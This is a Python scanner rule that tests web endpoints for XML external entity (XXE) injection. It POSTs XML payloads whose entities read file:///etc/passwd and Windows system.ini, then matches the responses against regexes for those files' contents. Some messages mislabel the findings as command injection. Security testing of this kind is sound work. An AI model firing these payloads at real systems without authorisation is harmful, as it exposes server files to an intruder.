import requests
import re

from activeScanRules.activeScanner import ActiveScanner

class ScanXXEInject(ActiveScanner):

    def __init__(self, visited_urls=None, log_file=None):
        super().__init__(visited_urls, log_file)


    def initialise_local_file_targets(self):
        local_file_targets = [
            ["file:///etc/passwd", re.compile(r"root:.:0:0")],
            ["file:///c:/Windows/system.ini", re.compile(r"^\[drivers]$")],
            ["file:///d:/Windows/system.ini", re.compile(r"^\[drivers]$")]
        ]
        return local_file_targets

    def initialise_xml_message(self):
        """
        <?xml version="1.0"?>
        <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        """
        xml_header = ("<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
                        "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"{payload}\"> ]>\n")
        xml_body = "<test>" + "&xxe;" + "</test>"
        xml_message = xml_header + xml_body
        return xml_message

    def test_payloads(self, target_url, form_fields):
        for target, pattern in self.initialise_local_file_targets():
            payload = self.initialise_xml_message().format(payload=target)
            print(payload)
            response = self.send_request_with_payload(payload, target_url)
            if self.check_response(response, payload, target_url, pattern):
                self.logger.warning(f"\tPotential XXE vulnerability found at: {target}")

    def send_request_with_payload(self, payload, target_url):
        user_agent = "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
        proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} # for burp testing purposes
        user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
        headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/xml'
        }
        try:
            response = requests.post(target_url, data=payload, headers=headers, proxies=proxies)
            return response
        except requests.RequestException as e:
            self.logger.error(f"\tAn error occurred while sending request: {e}")
            return None

    def check_response(self, response, payload, target_url, pattern):
        # Check if response indicates successful injection
        if response.status_code == 200:
            # Check if the response contains common command injection error messages or patterns
            if pattern.search(response.text):
                print(f"\tPotential command injection vulnerability found at: {target_url} with payload {payload}")
                self.logger.warning(
                    f"\tPotential command injection vulnerability found at: {target_url} with payload {payload}")
                return True
        else:
            self.logger.error(f"\tUnexpected response code ({response.status_code}) for {target_url}")
        return False


